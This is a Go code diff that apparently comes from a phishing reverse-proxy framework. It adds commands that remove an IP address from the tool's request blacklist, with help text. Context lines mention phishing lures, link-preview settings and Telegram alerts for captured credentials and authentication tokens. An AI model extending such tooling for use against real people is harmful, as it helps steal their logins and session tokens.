@@ -322,6 +322,14 @@ func (t *Terminal) handleBlacklist(args []string) error {
 				log.Info("blacklist log output: disabled")
 				return nil
 			}
+		case "delete", "remove":
+			err := t.p.bl.RemoveIP(args[1])
+			if err != nil {
+				log.Error("blacklist: %v", err)
+			} else {
+				log.Info("removed ip address '%s' from blacklist", args[1])
+			}
+			return nil
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
@@ -1320,7 +1328,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"edit", "og_url"}, "edit <id> og_url <title>", "sets opengraph url that will be shown in link preview, for a lure with a given <id>")
 
 	h.AddCommand("blacklist", "general", "manage automatic blacklisting of requesting ip addresses", "Select what kind of requests should result in requesting IP addresses to be blacklisted.", LAYER_TOP,
-		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))
+		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("delete"), readline.PcItem("remove")))
 
 	h.AddSubCommand("blacklist", nil, "", "show current blacklisting mode")
 	h.AddSubCommand("blacklist", []string{"all"}, "all", "block and blacklist ip addresses for every single request (even authorized ones!)")
@@ -1328,6 +1336,8 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("blacklist", []string{"noadd"}, "noadd", "block but do not add new ip addresses to blacklist")
 	h.AddSubCommand("blacklist", []string{"off"}, "off", "ignore blacklist and allow every request to go through")
 	h.AddSubCommand("blacklist", []string{"log"}, "log <on|off>", "enable or disable log output for blacklist messages")
+	h.AddSubCommand("blacklist", []string{"delete"}, "delete <ip_address>", "remove a specific ip address from the blacklist")
+	h.AddSubCommand("blacklist", []string{"remove"}, "remove <ip_address>", "remove a specific ip address from the blacklist")
 
 	h.AddCommand("telegram", "general", "manage telegram notifications", "Configures telegram notifications for captured credentials and authentication tokens.", LAYER_TOP,
 		readline.PcItem("telegram", readline.PcItem("webhook"), readline.PcItem("chat_id"), readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("test")))
